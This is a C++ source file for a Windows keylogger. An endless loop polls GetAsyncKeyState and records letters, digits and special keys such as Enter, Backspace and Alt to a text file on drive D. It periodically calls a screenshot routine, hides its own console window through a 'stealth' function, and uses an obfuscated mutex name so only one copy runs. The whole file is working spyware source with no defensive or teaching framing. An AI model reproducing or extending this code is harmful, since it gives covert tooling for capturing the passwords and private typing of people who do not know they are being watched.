#include "palantir.h"

#define minutes 20


void turnOn()
{
	short l;
	short temp;
	short i = 0;
	while (1)
	{


		VK();

		// 1 - &*
		for (l = 48; l < 58; l++)
		{
			temp = GetAsyncKeyState(l);

			if (temp == -32767 && GetAsyncKeyState(VK_SHIFT))
			{
				cout << (char)(l - 16);
				save(l - 16);
			}
			else if (temp == -32767 && !GetAsyncKeyState(VK_SHIFT))
			{
				cout << (char)l;
				save(l);
			}

		}

		// A-Z
		for (l = 65; l < 91; l++)
		{
			temp = GetAsyncKeyState(l);

			if (temp == -32767 && !GetAsyncKeyState(VK_SHIFT))
			{
				cout << (char)(l + 32);
				save((l + 32));
			}
			else if (temp == -32767 && GetAsyncKeyState(VK_SHIFT))
			{
				cout << (char)l;
				save(l);
			}
		}

		Sleep(100); //screenshot after time: minutes
		
		if (i % 600 * minutes == 0) scr();
		i++;
	}
}
void hide()
{

	HWND stealth;
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}


void save(int liczba)
{
	FILE * file;
	file = fopen("D:\\xd.txt", "a+");
	if (file != NULL)
	{
		fputc((char)liczba, file);
		fclose(file);
	}
}

void VK() {

	FILE * file;
	file = fopen("D:\\xd.txt", "a+");

	if (GetAsyncKeyState(VK_SPACE) == -32767)
	{
		cout << " ";
		fputs(" ", file);
	}

	if (GetAsyncKeyState(VK_RETURN) == -32767)
	{
		cout << "[ENTER]";
		fputs("[ENTER]", file);
	}
	if (GetAsyncKeyState(VK_BACK) == -32767)
	{
		cout << "[BS]";
		fputs("[BS]", file);
	}
	if (GetAsyncKeyState(VK_CAPITAL) == -32767)
	{
		cout << "[CS]";
		fputs("[CS]", file);
	}
	if (GetAsyncKeyState(VK_DELETE) == -32767)
	{
		cout << "[DEL]";
		fputs("[DEL]", file);
	}
	if (GetAsyncKeyState(VK_TAB) == -32767)
	{
		cout << "[TAB]";
		fputs("[TAB]", file);
	}
	if (GetAsyncKeyState(VK_ESCAPE) == -32767)
	{
		cout << "[ESC]";
		fputs("[ESC]", file);
	}
	if (GetAsyncKeyState(VK_MENU) == -32767)
	{
		cout << "[ALT]";
		fputs("[ALT]", file);
	}
	if (GetAsyncKeyState(VK_SNAPSHOT) == -32767)
	{
		cout << "[PRTSC]";
		fputs("[PRTSC]", file);
	}
	if (GetAsyncKeyState(VK_TAB) == -32767)
	{
		cout << "[TAB]";
		fputs("[TAB]", file);
	}
	fclose(file);

}

bool onlyOne()
{
	CreateMutex(NULL, TRUE, "fUwPdsaddNYJwEa#Zj#PIufiPh#t!1sO*7L2VRnG$#YF%JP2_GMD");

	if (GetLastError() == ERROR_ALREADY_EXISTS)
	{
		return true;
	}

	else
	{
		return false;
	}
}
